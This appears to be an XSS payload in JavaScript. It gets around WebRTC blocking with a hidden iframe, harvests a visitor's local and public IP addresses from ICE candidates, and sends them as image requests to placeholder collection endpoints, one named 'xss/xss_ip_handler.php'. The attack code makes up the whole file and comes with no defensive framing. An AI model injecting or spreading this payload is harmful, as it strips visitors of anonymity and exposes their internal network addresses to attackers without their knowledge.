function getIPs(callback){
    var ip_dups = {};
    //compatibility for firefox and chrome
    var RTCPeerConnection = window.RTCPeerConnection
        || window.mozRTCPeerConnection
        || window.webkitRTCPeerConnection;
    var useWebKit = !!window.webkitRTCPeerConnection;
    //bypass naive webrtc blocking
    if(!RTCPeerConnection){
        //create an iframe node
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        //invalidate content script
        iframe.sandbox = 'allow-same-origin';
        //insert a listener to cutoff any attempts to
        //disable webrtc when inserting to the DOM
        iframe.addEventListener("DOMNodeInserted", function(e){
            e.stopPropagation();
        }, false);
        iframe.addEventListener("DOMNodeInsertedIntoDocument", function(e){
            e.stopPropagation();
        }, false);
        //insert into the DOM and get that iframe's webrtc
        document.body.appendChild(iframe);
        var win = iframe.contentWindow;
        RTCPeerConnection = win.RTCPeerConnection
            || win.mozRTCPeerConnection
            || win.webkitRTCPeerConnection;
        useWebKit = !!win.webkitRTCPeerConnection;
    }
    //minimal requirements for data connection
    var mediaConstraints = {
        optional: [{RtpDataChannels: true}]
    };
    //firefox already has a default stun server in about:config
    //    media.peerconnection.default_iceservers =
    //    [{"url": "stun:stun.services.mozilla.com"}]
    var servers = undefined;
    //add same stun server for chrome
    if(useWebKit)
        servers = {iceServers: [{urls: "stun:stun.services.mozilla.com"}]};
    //construct a new RTCPeerConnection
    var pc = new RTCPeerConnection(servers, mediaConstraints);
    function handleCandidate(candidate){
        //match just the IP address
        var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/
        var ip_addr = ip_regex.exec(candidate)[1];
        //remove duplicates
        if(ip_dups[ip_addr] === undefined)
            callback(ip_addr);
        ip_dups[ip_addr] = true;
    }
    //listen for candidate events
    pc.onicecandidate = function(ice){
        //skip non-candidate events
        if(ice.candidate)
            handleCandidate(ice.candidate.candidate);
    };
    //create a bogus data channel
    pc.createDataChannel("");
    //create an offer sdp
    pc.createOffer(function(result){
        //trigger the stun server request
        pc.setLocalDescription(result, function(){}, function(){});
    }, function(){});
    //wait for a while to let everything done
    setTimeout(function(){
        //read candidate info from local description
        var lines = pc.localDescription.sdp.split('\n');
        lines.forEach(function(line){
            if(line.indexOf('a=candidate:') === 0)
                handleCandidate(line);
        });
    }, 1000);
}
//将结果返回到服务器
getIPs(function(ip){
    var li = document.createElement("li");
    li.textContent = ip;
    //local getIPs
    if (ip.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/)){
    new Image().src="http://ip/xss/xss_ip_handler.php?ip="+escape(ip);
}
    //assume the rest are public IPs
    else{
    new Image().src="http://ip/handler.php?ip="+escape(ip);
}
});
